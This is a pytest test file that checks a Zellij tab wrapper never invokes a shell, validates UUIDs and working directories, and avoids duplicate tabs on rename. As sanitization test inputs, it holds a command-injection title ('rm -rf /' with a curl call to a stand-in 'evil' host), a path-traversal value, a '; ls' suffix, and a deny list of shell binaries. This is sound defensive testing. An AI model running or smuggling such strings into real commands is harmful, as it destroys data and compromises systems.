"""Shell-free guarantees for the zellij wrapper.

These tests are the contract: no matter what the metadata/cwd/uuid contains,
the wrapper must NEVER invoke a shell. They also pin the rename-doesn't-duplicate
guarantee from issue #56's Hermes review #6.
"""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from agent_sessions import zellij


def _make_runner(*, existing_tabs: list[str] | None = None):
    """Stub for subprocess.run: replies to `query-tab-names` with the given tabs;
    no-ops on every other call. Records all invocations on `runner.calls`."""
    runner = MagicMock()
    runner.calls = []  # type: ignore[attr-defined]

    def side_effect(argv, **kw):
        runner.calls.append(argv)
        cp = MagicMock()
        cp.returncode = 0
        cp.stdout = "\n".join(existing_tabs or [])
        return cp

    runner.side_effect = side_effect
    return runner


# ---- shell-free contract ------------------------------------------------------


def test_no_call_uses_shell_true():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for call in runner.call_args_list:
        kwargs = call.kwargs
        assert kwargs.get("shell", False) is False, f"shell=True leaked: {call}"


def test_argv_is_a_list_not_a_string():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for argv in runner.calls:
        assert isinstance(argv, list), f"argv must be a list: {argv!r}"
        assert all(isinstance(a, str) for a in argv), f"all argv entries must be str: {argv!r}"


def test_never_invokes_bash_or_sh():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for argv in runner.calls:
        head = argv[0]
        assert head not in {
            "/bin/sh",
            "/bin/bash",
            "sh",
            "bash",
        }, f"unexpected shell at argv[0]: {argv!r}"
        assert "-c" not in argv, f"-c flag never belongs in our calls: {argv!r}"


def test_crafted_title_never_reaches_shell_context():
    """A title with shell-meta chars must be sanitized and STILL never reach a shell."""
    runner = _make_runner()
    nasty = "; rm -rf / && echo pwned `$(curl evil)`"
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title=nasty,
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    # find the new-tab call; the title should appear only inside the argv list
    new_tab_calls = [c for c in runner.calls if "new-tab" in c]
    assert new_tab_calls, "expected a new-tab call"
    name_idx = new_tab_calls[0].index("--name") + 1
    sanitized = new_tab_calls[0][name_idx]
    assert ";" not in sanitized
    assert "`" not in sanitized
    assert "$" not in sanitized
    assert len(sanitized) <= 64


# ---- input validation ---------------------------------------------------------


@pytest.mark.parametrize(
    "bad_uuid",
    [
        "not-a-uuid",
        "../../../etc/passwd",
        "",
        "abcdef12-1234-1234-1234-1234567890ab; ls",
        "abcdef12_1234_1234_1234_1234567890ab",
    ],
)
def test_bad_uuid_rejected(bad_uuid):
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_or_switch(
            uuid=bad_uuid,
            cwd="/tmp/x",
            title="t",
            allowed_cwds={"/tmp/x"},
            _runner=runner,
        )


def test_cwd_must_be_in_scanned_set():
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_or_switch(
            uuid="abcdef12-1234-1234-1234-1234567890ab",
            cwd="/etc",  # not in scanned set
            title="t",
            allowed_cwds={"/tmp/x"},
            _runner=runner,
        )


# ---- open-or-switch + rename idempotency --------------------------------------


def test_new_tab_when_no_existing(stub_zellij=None):
    runner = _make_runner(existing_tabs=[])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    assert len(new_tabs) == 1
    assert not go_to


def test_switch_when_short_uuid_prefix_matches():
    runner = _make_runner(existing_tabs=["abcdef12:hello"])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    assert len(go_to) == 1
    assert not new_tabs


def test_rename_does_not_create_duplicate_tab():
    """The bug from issue #56 Hermes review #6: renaming a session must not
    spawn a second Zellij tab on re-open. Lookup is by short-UUID prefix."""
    # Tab still carries the old title; sidebar now has the new title.
    runner = _make_runner(existing_tabs=["abcdef12:OLD title"])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="NEW title",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    rename = [c for c in runner.calls if "rename-tab" in c]
    assert not new_tabs, "renaming the sidebar title must not spawn a duplicate tab"
    assert len(go_to) == 1
    assert len(rename) == 1  # best-effort rename to match the new title


def test_engine_prefix_isolation_planned():
    """Sanity check: today we use bare ``<short-uuid>:`` prefix. When opencode (#61)
    lands, the convention switches to ``c:<short-uuid>:`` vs ``o:<short-uuid>:``.
    For now we just document the prefix shape used."""
    name = zellij.sanitize_tab_name("abcdef12", "test")
    assert name.startswith("abcdef12:")
